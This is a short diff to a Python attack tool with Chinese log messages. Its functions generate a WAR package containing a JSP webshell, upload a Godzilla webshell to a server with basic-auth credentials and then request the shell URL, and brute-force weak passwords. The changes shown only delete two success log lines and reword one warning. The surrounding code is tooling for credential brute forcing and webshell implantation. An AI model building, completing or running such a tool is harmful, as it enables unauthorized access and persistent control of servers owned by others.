@@ -59,7 +59,6 @@ def generate_war(config):
         # 删除临时 JSP 文件
         os.remove(shell_file_name)
 
-        logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
         return war_file_name, random_string, shell_file_name
     except Exception as e:
         logger.error(f"[-] WAR 包生成失败: {str(e)}")
@@ -119,8 +118,6 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
                 response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          files=files, verify=False, timeout=10)
             response.raise_for_status()
-
-            logger.info(f"{Fore.RED}[+] WAR 上传成功: {url} {Style.RESET_ALL}")
             shell_url = f"{url}/{random_string}/{shell_file_name}"
             shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                           verify=False, timeout=10)
@@ -175,7 +172,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
             break    # 如果检查完所有用户密码对则退出循环
         except requests.exceptions.RequestException as e:
             logger.warning(
-                f"{Fore.YELLOW}[!] 网站访问失败 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
+                f"{Fore.YELLOW}[!] 网站无法访问 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
             time.sleep(retry_delay)   # 重试前等待
             attempt += 1
     if attempt == max_retries:
